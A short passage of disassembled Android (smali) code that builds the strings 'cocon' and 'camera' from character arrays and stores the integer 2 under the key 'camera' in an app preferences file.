    const/4 v4, 0x5

    new-array v4, v4, [C

    fill-array-data v4, :array_0

    invoke-direct {v3, v4}, Ljava/lang/String;-><init>([C)V

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 134
    .local v1, "settings2":Landroid/content/SharedPreferences;
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 135
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v2, Ljava/lang/String;

    const/4 v3, 0x6

    new-array v3, v3, [C

    fill-array-data v3, :array_1

    invoke-direct {v2, v3}, Ljava/lang/String;-><init>([C)V

    const/4 v3, 0x2

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 136
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    goto :goto_0

    .line 133
    nop

    :array_0
    .array-data 2
        0x63s
        0x6fs
        0x63s
        0x6fs
        0x6es
    .end array-data

    .line 135
    nop

    :array_1
    .array-data 2
        0x63s
        0x61s
        0x6ds
        0x65s
        0x72s
        0x61s
    .end array-data
.end method
